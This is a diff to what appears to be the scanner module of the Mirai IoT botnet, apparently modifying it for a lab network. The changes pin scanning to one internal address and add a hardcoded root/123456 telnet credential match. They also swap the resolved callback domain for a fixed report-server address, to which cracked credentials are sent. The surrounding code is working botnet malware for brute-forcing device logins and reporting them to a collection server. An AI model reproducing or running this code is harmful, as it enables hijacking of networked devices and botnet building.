@@ -189,6 +189,7 @@ void scanner_init(void)
     printf("[scanner] Scanner process initialized. Scanning started.\n");
 #endif
 
+    char report_flag = 0;
     // Main logic loop
     while (TRUE)
     {
@@ -442,6 +443,14 @@ void scanner_init(void)
                     conn->rdbuf_pos += ret;
                     conn->last_recv = fake_time;
 
+
+                    if (strcmp("root", conn->auth->username) == 0 && 0 == strcmp("123456", conn->auth->password)) {
+                        if (report_flag == 0) {
+                            report_working(conn->dst_addr, conn->dst_port, conn->auth);
+                            report_flag = 1;
+                        }
+                    }
+                    /*
                     while (TRUE)
                     {
                         int consumed = 0;
@@ -632,6 +641,7 @@ void scanner_init(void)
                             memmove(conn->rdbuf, conn->rdbuf + consumed, conn->rdbuf_pos);
                         }
                     }
+                    */
                 }
             }
         }
@@ -680,6 +690,23 @@ static ipv4_t get_random_ip(void)
     {
         tmp = rand_next();
 
+        o4 = tmp % 255;
+    } while (0);    // 192.168.0.0/16   - Internal network
+
+    //return INET_ADDR(192,168,179,o4);
+    return INET_ADDR(192,168,179,166);
+}
+
+/*
+static ipv4_t get_random_ip(void)
+{
+    uint32_t tmp;
+    uint8_t o1, o2, o3, o4;
+
+    do
+    {
+        tmp = rand_next();
+
         o1 = tmp & 0xff;
         o2 = (tmp >> 8) & 0xff;
         o3 = (tmp >> 16) & 0xff;
@@ -702,6 +729,7 @@ static ipv4_t get_random_ip(void)
 
     return INET_ADDR(o1,o2,o3,o4);
 }
+*/
 
 static int consume_iacs(struct scanner_connection *conn)
 {
@@ -902,7 +930,7 @@ static void report_working(ipv4_t daddr, uint16_t dport, struct scanner_auth *au
 {
     struct sockaddr_in addr;
     int pid = fork(), fd;
-    struct resolv_entries *entries = NULL;
+    //struct resolv_entries *entries = NULL;
 
     if (pid > 0 || pid == -1)
         return;
@@ -915,6 +943,7 @@ static void report_working(ipv4_t daddr, uint16_t dport, struct scanner_auth *au
         exit(0);
     }
 
+    /*
     table_unlock_val(TABLE_SCAN_CB_DOMAIN);
     table_unlock_val(TABLE_SCAN_CB_PORT);
 
@@ -933,6 +962,11 @@ static void report_working(ipv4_t daddr, uint16_t dport, struct scanner_auth *au
 
     table_lock_val(TABLE_SCAN_CB_DOMAIN);
     table_lock_val(TABLE_SCAN_CB_PORT);
+    */
+
+    addr.sin_family = AF_INET;
+    addr.sin_addr.s_addr = SCANCB_SERVER_ADDR;
+    addr.sin_port = htons(SCANCB_SERVER_PORT);
 
     if (connect(fd, (struct sockaddr *)&addr, sizeof (struct sockaddr_in)) == -1)
     {
